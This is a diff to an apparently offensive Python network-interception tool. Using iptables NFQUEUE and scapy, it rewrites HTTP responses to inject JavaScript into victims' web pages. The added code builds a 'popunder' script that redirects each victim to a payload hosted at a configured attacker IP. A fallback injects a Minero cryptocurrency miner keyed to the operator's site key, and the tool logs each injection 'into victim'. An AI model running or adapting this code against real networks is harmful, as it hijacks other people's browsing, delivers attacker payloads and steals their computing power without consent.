@@ -51,6 +51,22 @@ print('Adding OUTPUT chain rule to iptables')
 os.system('iptables -I OUTPUT -j NFQUEUE --queue-num 1')
 print('Setup complete')
 
+attackerIp = str(config['attackerIp'])
+payloadName = str(config['payloadName'])
+
+popunderPayload="""
+<script>
+var alreadyHasPopUnder = window.location.search.includes('nopopunder');
+if(!alreadyHasPopUnder){{
+var url = "{0}/{1}?12345";
+window.open(window.location.href + "?nopopunder", "_blank");
+window.location.replace(url);
+}}
+</script>
+""".format(attackerIp,payloadName)
+
+openPopUnders = {}
+
 def change_payload(packet, load):
     	packet[scapy.Raw].load = load
     	del packet[scapy.IP].len
@@ -67,7 +83,7 @@ def inject_code(packet):
 		if http_packet.haslayer(scapy.Raw):
         		load = http_packet[scapy.Raw].load
 
-			if http_packet[scapy.TCP].sport ==443 or  '301' in load or '501' in load or '400' in load or '404' in load or '503' in load:
+			if config['attackerIp'] in http_packet.src or config['attackerIp'] in http_packet.dst or http_packet[scapy.TCP].sport == 443 or '301' in load or '501' in load or '400' in load or '404' in load or '503' in load:
 		    		packet.accept()
 	    			return
 
@@ -76,24 +92,27 @@ def inject_code(packet):
             			load = load.replace("HTTP/1.1", "HTTP/1.0")
 
         		if http_packet[scapy.TCP].sport == 80:
-#				layer = http_packet[scapy.load_layer("http")]
-
-#				print(layer)
-
 				injectionCode = ""
 
 				customJsPath = str(config["customInjection"])
+				usePopUnder = str(config["usePopUnder"]) == True
 
-				if 'path/to/your/js' not in customJsPath and customJsPath != "":
-					injectionCode = open(config["customInjection"], "r").read()
+				if 'path/to/your/js' not in customJsPath and customJsPath != "" and not usePopUnder:
+#					print('Getting custom injection code')
+					injectionCode = open(customJsPath, "r").read()
+				elif usePopUnder:
+#					print('Sending a popunder attack')
+					openPopUnders[http_packet.dst] = datetime.now()
+					injectionCode = popunderPayload
 				else:
+#					print('Injecting stock miner')
 					injectionCode = "<script src='https://minero.cc/lib/minero.min.js'></script>"
 					injectionCode = injectionCode+"<script>var miner = new Minero.Anonymous(\'" + str(config["siteKey"]) +  "\');miner.start();</script>";
 
-#				print(load)
 				length_search=False
 
 				if "</body>" in load or "</BODY>" in load:
+#					print('injecting code now')
 					load = load.replace("</body>", injectionCode + "</body>")
 					load = load.replace("</BODY>", injectionCode + "</BODY>")
 					length_search = re.search("(?:Content-Length:\s)(\d*)", load)
@@ -103,16 +122,16 @@ def inject_code(packet):
 					injected=True
 					onlyContentLengthAdjustment=True
 
-	      				if length_search and "text/html" in load:
-      		        			length = length_search.group(1)
-			 			new_length = int(length) + len(injectionCode)
-        					load = load.replace(length, str(new_length))
+      				if length_search and "text/html" in load:
+	        			length = length_search.group(1)
+		 			new_length = int(length) + len(injectionCode)
+        				load = load.replace(length, str(new_length))
 
 
 			ipConstraint = str(config["ipConstraint"])
 			ipConstraintActive = ipConstraint != ""
 
-	        	if injected and (ipConstraint in http_packet.dst and ipConstraintActive) or (not ipConstraintActive and load != http_packet[scapy.Raw].load):
+	        	if injected and ((ipConstraint in http_packet.dst and ipConstraintActive) or (not ipConstraintActive and load != http_packet[scapy.Raw].load)):
 				dateTime = datetime.now()
 				if not onlyContentLengthAdjustment:
 		   			print('injection new packet into victim at ' + http_packet.dst + " at " + dateTime.strftime("%Y-%m-%d %H:%M:%S"))
